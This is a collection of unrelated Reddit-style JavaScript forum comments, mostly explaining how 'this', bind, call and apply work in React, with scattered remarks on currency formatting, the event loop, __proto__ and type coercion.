Thanks! That's a really good explanation. That's what I sort of thought it was. But then why does React seem to use it differently? It binds this to other functions and then calls this in a different function? Maybe I'm just not getting React very well but that seems unlike the "this" of your metaphor. 
The App has been built upon React, [NextJs](https://github.com/zeit/next.js/), Redux. Deployed and hosted with [Zeit Now](https://zeit.co/now). This is still a Work in Progress, but I thought it could be fun to share it with you guys! Feedbacks are welcome ✌🏽😀
Why use the binding of this to other stuff? Isn't the point of this that it keeps stuff within the scope of the object it's called within? It seems then binding this to something else defeats the purpose of this. 
Heh, yeah... I feel that. it's the pronounness of it that makes it kind of flaky. 
It's pretty well supported by Safari - https://kangax.github.io/compat-table/esintl/ Do you have an example that doesn't work?
Ah then the reddit topic I got that from last night was incorrect. He has contributed to npm, though. 
That's... actually really good. So I get the first example and the second one pretty easy. The problem I'm having is with how React uses this. Which one of these examples would be analogous to React's use of it? Like it binds this to different things so and then calls this in a different function than the one that this is bound to? Which I don't understand why...?
That's basically what I thought. So I don't get why React does all this binding of this etc? Like why bind this?
Thanks, this looks super useful :)
I wouldn't say React does it differently since it's just JS after all. In React, when you create a component, it's a box. But when you start passing values from that box to others, it's no longer Box A that has "doList" instructions but now Box B. So when Box B goes for instruction "doList" and that instruction references "box", it's looking side Box B because that's the box it is in. To get around this and to tie and instruction to the box it was first created in, we can use class properties with arrow functions or bind the box to the instructions, both of which seem to be common React patterns. 
Ooooh okay so is the reason React does binding of this is so that the context of the school can be available to the classroom?
Thanks!
There have been people who helped me out on here in the past.
There is much more than 2 queues. Event loop isn't even run inside js. JS engine is run by event loop. Here you have more detailed explanation how this works in node.js -&gt; https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/
I can’t think of any really practical use cases. However, one could argue that the top version forced you to define functions before using them, which can reduce potentially confusing situations when you are reading thru source code. Ever looked at someone else’s code and thought “wait where is that function defined?” I know I have.
Correct. `bind` creates a new function with the the `this` parameter explicitly set. const badGreeting = obj.hello; badGreeting(); // Hello [object Window] const goodGreeting = obj.hello.bind(obj); goodGreeting(); // Hello [object Object] `call` and `apply`, by contrast call the function immediately. We can use this to fix our bad greeting, or even call it with something totally different as `this`: badGreeting.call(obj); // Hello [object Object] badGreeting.call('world!'); // Hello world!
Yes!!
That would be it. It uses a super() function that makes this available.
Which is why there are separate configurations for locale and for the currency. Consider: &gt; 100.42 .toLocaleString('en-US', {style: 'currency', currency: 'USD'}) &lt; "$100.42" and: &gt; 100.42 .toLocaleString('de-DE', {style: 'currency', currency: 'USD'}) &lt; "100,42 $" 
I think the explicit override is what is confusing me in React. Why would you do that?
Okay, not *exactly*. With React, you're basically calling an architect and saying "Do me a favor and build a kitchen where it's possible to sweep a broom?" Every time the architect builds a kitchen, he has to say, "when you're sweeping broom, you're sweeping THIS KITCHEN". How's that?
Ooooh thanks, that helps a bunch. To give a more visual narrative to the school example. If I had a component in react called School, and it had a component in it called Class, and I wanted the kids in the class to go to lunch when food in the cafeteria was ready for lunch, then I'd need to bind this to cafeteria and then inside the classroom I could have a function goToLunch.this and that would execute the goToLunch function inside of the Classroom (the students being objects effected by this function) which would then use the this as the location... wait that's not right... goToLunch would be a function inside of the cafeteria and "this" would be bound to the children objects in the Classroom, right? So when you called goToLunch in the cafeteria it would summon all the students. Could you bind this to students in multiple classrooms, so that when you call goToLunch it would summon from all of the classrooms where you bound this?
Go to say, I agree with you. The problem arises from the fact that current calling context doesn't explain the weird use of it in React for me. 
IDK man, there's been some pretty good metaphors here. I'm still confused on why it's used the way it is in React, but there's a guy below I'm talking with who I think might have cleared up even that for me, I'm just waiting to hear back his response. 
Sounds good.
Okay I think that might help, along with this conversation I'm having with /u/js_developer here: https://www.reddit.com/r/javascript/comments/7yki4d/explain_like_im_5_this/duhfhu4/ In his example of the school and the classroom, my example was about the students, as objects of the Classroom being summoned to the Cafeteria using a function inside of Classroom called goToLunch.this where this is bound to Cafeteria. Is that kind of similar? 
This was helpful. thanks!
Safari has "no, fuck you" money.
Amb
Oh sure - some type coercion is great, but things like `200 == "200"` are just *asking* for trouble. I should have clarified that I was complaining about some of the *choices* that were made on JS's type coercion, not the fact of it at all.
Oh sure - some type coercion is great, but things like `200 == "200"` are just *asking* for trouble. I should have clarified that I was complaining about some of the *choices* that were made on JS's type coercion, not the fact of it at all.
I've forgotten to say there is no poem, yet. I'm writing it at the moment, so I placed that bug to make me more time.
Oh, I missed that part where the locale and currency are independent. Makes sense.
I use the accounting.js, it is super easy
I got around to testing this: https://github.com/Punk-UnDeaD/node-sass-export and it's actually solving my exact problem right now. Pretty clever!
This looks really awesome, but do you have jQuery as a dependency solely to attach a `load`/`DOMContentLoaded` EventListener to the document and a `resize` EventListener to the window? 🤔
hmm i tried to require/import fs from one of my components and it is coming up undefined. Ive also tried to use npm package file-system but the lib does not have the appendFileSync function. any suggestions?
Here, what I think I understand seems to be different from what /u/js_developer is telling you, so I'm going to need to drop the ELI5 and maybe they can correct me. It's also possible that I just misunderstand what question you're asking... When you define a component in React, you're really defining a blueprint. React takes the blueprint and creates a new "object" * out of it, which means it gets its own scope. Any additional work you need to do will need to be done inside the scope of this newly created object. Since this newly created object does not exist when you're writing the code (because the code is not running), you need a way to tell React that you want to attach some specific behavior to this object once it is created. That is the reason for using the `bind` function. As a reminder, the `bind` function operates on a function and takes as arguments a new scope as well as optional parameters to be partially applied, and it returns _a new function_. So what you are really saying when you are writing the code is: "Hey, React architect, here is a template for the room I want you to build, and here is a template for the action I need to be able to perform inside the room when it's built, so when you build the room, please also make sure I can perform the action inside the newly-created room." ---- .* what React really does internally is irrelevant, but thinking of it as an object is useful for this next bit
Let's see your code.
 __proto__ Is the non-standard bastard child that all the browsers implemented to refer to the prototype object. In ES2015 they added an official way to access the prototype object with this method: Object.getPrototypeOf( myObject ); Where Object is the keyword Object and myObject is the variable referring to my own object and I want to get the prototype of my own object.
What, Safari?